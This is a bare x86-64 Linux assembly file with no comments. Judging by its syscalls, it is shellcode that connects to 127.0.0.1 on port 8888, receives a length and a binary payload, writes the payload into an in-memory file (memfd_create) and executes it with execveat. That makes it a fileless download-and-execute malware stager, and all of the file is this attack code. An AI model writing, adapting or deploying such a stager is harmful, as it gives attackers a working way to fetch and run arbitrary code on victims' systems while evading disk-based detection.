section .text
global _start

_start:
    push 0x29
    pop rax
    cdq
    push 0x2
    pop rdi
    push 0x1
    pop rsi
    syscall

    xchg rdi, rax
    mov rcx, 0x0100007fb8220002
    push rcx
    mov rsi, rsp
    push 0x10
    pop rdx
    push 0x2a
    pop rax
    syscall

    pop rcx
    push 0x8
    pop rdx
    push 0x0
    lea rsi, [rsp]
    xor rax, rax
    syscall

    pop r12
    push rdi
    pop r13

    xor rax, rax
    push rax
    push rsp
    sub rsp, 8
    mov rdi, rsp
    push 0x13f
    pop rax
    xor rsi, rsi
    syscall

    push rax
    pop r14

    push 0x9
    pop rax
    xor rdi, rdi
    push r12
    pop rsi
    push 0x7
    pop rdx
    xor r9, r9
    push 0x22
    pop r10
    syscall

    push rax
    pop r15

    push 0x2d
    pop rax
    push r13
    pop rdi
    push r15
    pop rsi
    push r12
    pop rdx
    push 0x100
    pop r10
    syscall

    push 0x1
    pop rax
    push r14
    pop rdi
    push r12
    pop rdx
    syscall

    push 0x142
    pop rax
    push r14
    pop rdi
    push rsp
    sub rsp, 8
    mov rsi, rsp
    xor r10, r10
    xor rdx, rdx
    push 0x1000
    pop r8
    syscall
